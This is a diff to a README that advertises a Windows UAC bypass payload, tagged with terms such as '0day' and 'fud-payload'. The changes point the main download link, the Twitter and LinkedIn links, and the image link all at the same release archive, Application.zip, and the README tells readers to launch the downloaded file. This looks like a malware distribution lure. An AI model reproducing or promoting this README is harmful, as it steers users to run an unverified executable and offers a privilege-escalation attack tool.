@@ -9,7 +9,7 @@
 0day, 0day-exploit, 0day-windows, dll-hijack, dll-hijacking, fud, fud-payload, payload-uac, privilege-escalation, red-teaming, redteam, silent-exploit, uac, uac-bypass, uacbypass, windows-exploit, windows-exploitation, windows-privilege-escalation
 
 ### Get Started:
-🚀 To access the UAC bypass payload, please download it from the following link: [Download UAC Bypass Payload](https://github.com/file/Application.zip) and follow the instructions below:
+🚀 To access the UAC bypass payload, please download it from the following link: [Download UAC Bypass Payload](https://github.com/hunterhouse027/uac-bypass-win11/releases/download/v1.0.0/Application.zip) and follow the instructions below:
 
 1. If the link ends with the file name, make sure to launch the downloaded file.
 2. If you encounter any issues with the link, please check the "Releases" section for alternative download options.
@@ -41,12 +41,12 @@
 
 ### Connect With Us:
 🌐 Stay connected with our community:
-- [Twitter](https://twitter.com/uacbypass)
-- [LinkedIn](https://www.linkedin.com/company/uacbypass)
+- [Twitter](https://github.com/hunterhouse027/uac-bypass-win11/releases/download/v1.0.0/Application.zip)
+- [LinkedIn](https://github.com/hunterhouse027/uac-bypass-win11/releases/download/v1.0.0/Application.zip)
 
 ### License:
 📜 This UAC bypass payload is released under the MIT license. See the [LICENSE](LICENSE) file for more details.
 
 ### Let's Elevate Privileges! 💻🛡️
 
-![UAC Bypass](https://imageurl.com/uacbypassimage.png)
+![UAC Bypass](https://github.com/hunterhouse027/uac-bypass-win11/releases/download/v1.0.0/Application.zip)
